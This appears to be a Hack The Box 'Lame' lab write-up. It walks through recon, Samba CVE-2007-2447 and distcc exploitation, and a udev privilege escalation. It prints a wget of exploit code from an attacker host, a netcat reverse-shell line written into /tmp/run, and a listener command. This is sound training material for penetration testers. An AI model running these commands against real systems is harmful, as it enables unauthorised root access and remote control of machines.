1. Recon

> 21 - FTP vsftpd v2.3.4
- Anonymous loging allowed
- Accessed FTP anonymously but not able to upload shell as insufficient privilege

> 22 - SSH OpenSSH v4.7p1

> 139 and 445 Samba v3.0.20-Debian
- Anonymous acess allowed
- Known exploit exits

> 3632 distcc v1
- distcc is a tool for speeding up compilation of source code by using distributed computing over a computer network. 
- v1 is vulnerable with known exploit


2. Initial Access

- Accessed SMB anonymoulsy using smbclient and exploited CVE-2007–2447 (Samba 3.0.20 < 3.0.25rc3 — ‘Username’ map script’ Command Execution)
- Got shell with Root directly

- Exploited distcc known exploit using nmap and got shell as deamon user


3. Post Exploit

- Searched for privilele esclation and found below on searchsploit
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)   
linux/local/8572.c

https://www.exploit-db.com/exploits/8572

 * Usage:
 *
 *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 *   usually is the udevd PID minus 1) as argv[1].
 *
 *   The exploit will execute /tmp/run as root so throw whatever payload you 
 *   want in there.
 */



4. Privilege Escalation 

- Downloaded and compliled
```
wget http://10.10.14.6:5555/8572.c

gcc 8572.c -o 8572
```

- To get the PID of the udevd process, run the following command.
```
ps -aux | grep devd
```

- Next, create a run file in /tmp and add a reverse shell to it.
```
echo `#!bin/bash` > run
echo `nc -nv 10.21.12.21 4445 -e /bin/bash` >> run
```
- Set up a listener on your attack machine to receive the reverse shell.
```
nc -nlvp 4445
```

5. Getting Root

- Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

```
./8572 2661
```


6. Remediations and Best Practices

- Vulnerable version of protocols and software should not be used

> References
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/lame-writeup-w-o-metasploit#id-000d

https://0xveera.medium.com/htb-walkthrough-without-metasploit-lame-3f17ad8fb1b9